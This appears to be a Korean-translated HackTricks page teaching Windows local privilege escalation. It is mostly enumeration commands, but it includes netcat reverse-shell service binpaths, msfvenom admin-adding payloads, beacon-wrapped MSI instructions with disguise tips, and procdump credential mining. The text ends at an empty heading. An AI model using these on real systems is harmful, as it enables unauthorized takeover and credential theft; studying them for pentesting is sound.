# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors를 찾는 데 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### 액세스 토큰

**Windows 액세스 토큰이 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 무결성 수준

**Windows의 무결성 수준이 무엇인지 모른다면 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 보안 제어

Windows에는 시스템을 **열거하는 것을 방해**하거나 실행 파일 실행을 못하게 하거나 심지어 **활동을 탐지**할 수 있는 여러 요소가 있습니다. privilege escalation enumeration을 시작하기 전에 다음 **페이지**를 **읽고** 이러한 모든 **방어** **메커니즘**을 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## 시스템 정보

### 버전 정보 열거

Windows 버전이 알려진 취약점이 있는지 확인하세요(적용된 패치도 함께 확인하세요).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 버전 Exploits

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 상세 정보를 검색하는 데 유용합니다. 이 데이터베이스에는 4,700개가 넘는 보안 취약점이 있어 Windows 환경이 제공하는 **거대한 공격 표면**을 보여줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas에는 watson이 포함되어 있음)_

**시스템 정보로 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploits의 Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

환경 변수에 자격 증명이나 민감한 정보가 저장되어 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 파일

이를 활성화하는 방법은 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 확인할 수 있습니다
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 파이프라인 실행의 세부사항이 기록되며, 실행된 명령, 명령 호출 및 스크립트의 일부가 포함됩니다. 다만 전체 실행 세부사항과 출력 결과는 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르되, **"Module Logging"**을 **"Powershell Transcription"** 대신 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그의 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

완전한 활동 및 script의 execution 전체 콘텐츠 기록이 캡처되어 실행되는 모든 block of code가 실행 시 문서화되도록 보장합니다. 이 과정은 각 활동의 포괄적인 audit trail을 보존하여 forensics 및 malicious behavior 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써 프로세스에 대한 자세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block에 대한 로깅 이벤트는 Windows 이벤트 뷰어의 다음 경로에서 찾을 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S** 대신 http로 요청되는 경우 시스템을 탈취할 수 있습니다.

다음 명령을 cmd에서 실행하여 네트워크가 SSL이 아닌 WSUS 업데이트를 사용하는지 확인합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음을 실행:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받으면:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up의 `Write-UserAddMSI` 명령을 사용하여 현재 디렉터리 내에 권한 상승용 Windows MSI 바이너리를 생성하세요. 이 스크립트는 사용자/그룹 추가를 요구하는 사전 컴파일된 MSI 설치파일을 출력합니다(따라서 GIU access가 필요합니다):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

이 튜토리얼을 읽어 MSI wrapper를 만드는 방법을 배우세요. 참고로 **.bat** 파일을 래핑할 수 있으며, 단순히 **execute** **command lines**만 수행하려는 경우에 유용합니다.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- **Visual Studio**를 열고 **Create a new project**를 선택한 다음 검색 상자에 "installer"를 입력합니다. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭하세요.
- 프로젝트 이름은 **AlwaysPrivesc**처럼 지정하고 위치는 **`C:\privesc`**로 설정한 뒤 **place solution and project in the same directory**를 선택하고 **Create**를 클릭합니다.
- 파일 포함을 선택하는 3단계(4단계 중)까지 **Next**를 계속 클릭합니다. **Add**를 클릭하고 앞서 생성한 Beacon payload를 선택한 후 **Finish**를 클릭하세요.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 선택한 뒤 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
- 설치된 앱을 더 합법적으로 보이게 할 수 있는 **Author** 및 **Manufacturer** 같은 다른 속성도 변경할 수 있습니다.
- 프로젝트를 우클릭하고 **View > Custom Actions**를 선택합니다.
- **Install**을 우클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 더블클릭하고 `beacon.exe` 파일을 선택한 후 **OK**를 클릭합니다. 이렇게 하면 설치 프로그램이 실행되면 바로 beacon payload가 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경합니다.
- 마지막으로 **build it** 합니다.
- 경고 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`가 표시되면 플랫폼을 x64로 설정했는지 확인하세요.

### MSI Installation

악성 **installation** of the `.msi` 파일을 **background**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 exploit하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 안티바이러스 및 탐지기

### 감사 설정

이 설정은 무엇이 **기록되는**지 결정하므로 주의해야 합니다
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, 로그가 어디로 전송되는지 아는 것이 흥미롭다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고, 무작위화되며, 정기적으로 갱신되도록** 로컬 Administrator 비밀번호 관리를 위해 설계되었습니다. 이러한 비밀번호는 Active Directory에 안전하게 저장되며, ACLs를 통해 충분한 권한이 부여된 사용자만 접근할 수 있어 승인이 있는 경우 로컬 admin 비밀번호를 볼 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화되어 있는 경우, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Starting with **Windows 8.1**, Microsoft introduced enhanced protection for the Local Security Authority (LSA) to **block** attempts by untrusted processes to **read its memory** or inject code, further securing the system.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에 도입되었습니다. 그 목적은 장치에 저장된 자격 증명을 pass-the-hash 공격과 같은 위협으로부터 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 캐시된 자격 증명

**도메인 자격 증명**은 **로컬 보안 기관(LSA)**에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 일반적으로 해당 사용자에 대한 도메인 자격 증명이 설정됩니다.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거하기

소속된 그룹 중 흥미로운 권한을 가진 그룹이 있는지 확인하세요.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

만약 당신이 **어떤 특권 그룹에 속해 있다면 권한을 상승시킬 수 있습니다**. 여기에서 특권 그룹과 이를 악용하여 권한을 상승시키는 방법을 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 조작

**자세히 알아보기**: 이 페이지에서 **token**이 무엇인지 확인하세요: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지를 확인하여 **흥미로운 tokens에 대해 배우고 이를 악용하는 방법을 알아보세요**:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인된 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 암호 정책
```bash
net accounts
```
### 클립보드 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

무엇보다도, 프로세스를 나열할 때 **프로세스의 command line에 비밀번호가 있는지 확인하세요**.\
실행 중인 **binary를 덮어쓸 수 있는지** 또는 binary 폴더에 쓰기 권한이 있는지 확인하여 잠재적인 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 악용할 수 있는지 판단하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 [**electron/cef/chromium debuggers**가 실행 중인지 확인하세요 — 이를 악용해 권한을 상승시킬 수 있습니다](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리의 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

실행 중인 프로세스의 메모리 덤프는 **procdump** from sysinternals를 사용해 만들 수 있습니다. FTP 같은 서비스는 **credentials in clear text in memory**를 가지고 있는 경우가 있으니, 메모리를 덤프해서 credentials를 읽어보십시오.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 취약한 GUI 앱

**SYSTEM로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색할 수 있게 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1), "command prompt"를 검색한 후 "Click to open Command Prompt"를 클릭하세요.

## 서비스

Service Triggers는 Windows가 특정 조건(named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.)이 발생할 때 서비스를 시작하도록 합니다. SERVICE_START 권한이 없어도 트리거를 발동시켜 권한이 있는 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 다음을 참조하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록을 얻으려면:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

서비스 정보를 얻기 위해 **sc**를 사용할 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하려면 _Sysinternals_의 바이너리 **accesschk**를 사용하는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스를 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[여기에서 accesschk.exe (XP용)를 다운로드할 수 있습니다](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음과 같은 오류가 발생하는 경우(예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음 명령을 사용하여 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 upnphost가 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요 (XP SP1의 경우)**

**또 다른 해결 방법**은 이 문제에 대해 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **서비스 바이너리 경로 수정**

서비스에 대해 "Authenticated users" 그룹이 **SERVICE_ALL_ACCESS** 권한을 가지고 있는 경우, 서비스의 실행 파일 바이너리를 수정할 수 있습니다. 수정하고 실행하려면 **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한은 다음과 같은 여러 권한을 통해 권한 상승이 가능합니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리의 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하며, 결과적으로 서비스 구성을 변경할 수 있게 합니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성 변경 권한을 상속합니다.
- **GENERIC_ALL**: 서비스 구성 변경 권한을 상속합니다.

이 취약점의 탐지 및 악용에는 _exploit/windows/local/service_permissions_ 를 사용할 수 있습니다.

### Services binaries weak permissions

**서비스에 의해 실행되는 바이너리를 수정할 수 있는지 확인하세요** 또는 **폴더에 대한 쓰기 권한이 있는지**(바이너리가 위치한 곳) 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
서비스에 의해 실행되는 모든 바이너리는 **wmic**을 사용( system32가 아님 )하여 얻을 수 있으며 권한은 **icacls**로 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또한 **sc**와 **icacls**를 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 레지스트리 수정 권한

서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
서비스 **레지스트리**에 대한 **권한**을 **확인**하려면 다음을 수행하세요:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
다음을 확인해야 합니다: **Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지. 그렇다면 서비스가 실행하는 바이너리를 수정할 수 있습니다.

실행되는 바이너리의 경로를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 서비스 레지스트리 AppendData/AddSubdirectory 권한

레지스트리에 대해 이 권한이 있으면 **해당 레지스트리로부터 하위 레지스트리를 생성할 수 있습니다**. Windows 서비스의 경우 이는 **임의의 코드를 실행하기에 충분합니다:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일 경로가 따옴표로 감싸져 있지 않으면, Windows는 공백 이전의 각 경로 조각을 실행하려고 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_의 경우 Windows는 다음을 실행하려 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장 Windows 서비스에 속하지 않는 인용 부호가 없는 모든 서비스 경로를 나열:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**이 취약점을 탐지하고 exploit할 수 있습니다** metasploit: `exploit/windows/local/trusted\_service\_path`  
metasploit로 수동으로 서비스 바이너리를 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 복구 작업

Windows에서는 서비스가 실패할 경우 실행할 작업을 지정할 수 있습니다. 이 기능은 특정 binary를 가리키도록 구성할 수 있습니다. 이 binary를 교체할 수 있다면 privilege escalation이 가능할 수 있습니다. 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인할 수 있습니다.

## 애플리케이션

### 설치된 애플리케이션

**binaries의 권한** (어쩌면 하나를 덮어써서 escalate privileges가 가능할 수 있습니다) 및 **폴더** ([DLL Hijacking](dll-hijacking/index.html))의 권한을 확인하세요.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

일부 구성 파일을 수정하여 특정 파일을 읽을 수 있는지, 또는 Administrator 계정에 의해 실행될 일부 바이너리(schedtasks)를 수정할 수 있는지 확인하세요.

시스템에서 취약한 폴더/파일 권한을 찾는 한 가지 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 시작 시 실행

**다른 사용자에 의해 실행될 레지스트리 또는 바이너리를 덮어쓸 수 있는지 확인하세요.**\
**읽어보세요** **다음 페이지**에서 흥미로운 **autoruns locations to escalate privileges**에 대해 더 알아보세요:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

가능한 **third party weird/vulnerable** 드라이버를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
드라이버가 임의의 커널 읽기/쓰기 primitive를 노출하는 경우(잘못 설계된 IOCTL 핸들러에서 흔함), 커널 메모리에서 직접 SYSTEM 토큰을 훔쳐 권한 상승할 수 있습니다. 단계별 기법은 다음을 참조하세요:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive 메모리 손상 primitives

